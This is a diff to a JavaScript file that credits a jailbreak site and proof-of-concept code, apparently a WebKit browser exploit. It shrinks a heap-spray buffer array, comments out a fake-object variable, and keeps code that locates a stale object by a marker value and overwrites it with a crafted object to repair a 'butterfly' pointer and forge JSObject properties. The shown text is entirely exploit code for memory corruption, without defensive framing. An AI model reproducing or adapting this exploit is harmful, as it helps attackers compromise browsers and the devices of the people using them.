@@ -1,6 +1,6 @@
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
-var bufs = new Array(10000);
+var bufs = new Array(1000);
 //
 
 
@@ -14,8 +14,8 @@ var smsh = new Uint32Array(0x10)
 function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
-var fakeobj = {};
-var fop = 0;
+//var fakeobj = {};
+//var fop = 0;
 
 var mem0 = 0;
 var mem1 = 0;
@@ -177,7 +177,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			if(bufs[i][k] == 0x41414242) {
 				// Create fakeobj for fixing butterfly ptr
-				stale[0] = fakeobj;
+				//stale[0] = fakeobj;
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
